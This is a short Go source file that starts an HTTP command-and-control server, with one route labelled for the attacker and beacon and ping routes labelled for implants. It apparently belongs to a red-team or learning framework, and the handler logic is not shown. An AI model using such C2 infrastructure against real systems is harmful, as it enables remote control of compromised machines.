package c2

import (
	"fmt"
	"log"
	"net/http"

	"server/handlers"
)

func HttpInit(port string) {
	fmt.Printf("[*] - HTTP C2 server listening on port %s...\n", port)

	/* Attacker Routes */
	http.HandleFunc("/command/ping", handlers.PingC2)

	/* Implant Routes */
	http.HandleFunc("/beacon", handlers.Beacon)
	http.HandleFunc("/ping", handlers.Ping)

	// Run server
	var serverPort string = fmt.Sprintf(":%s", port)
	log.Fatal(http.ListenAndServe(serverPort, nil))
}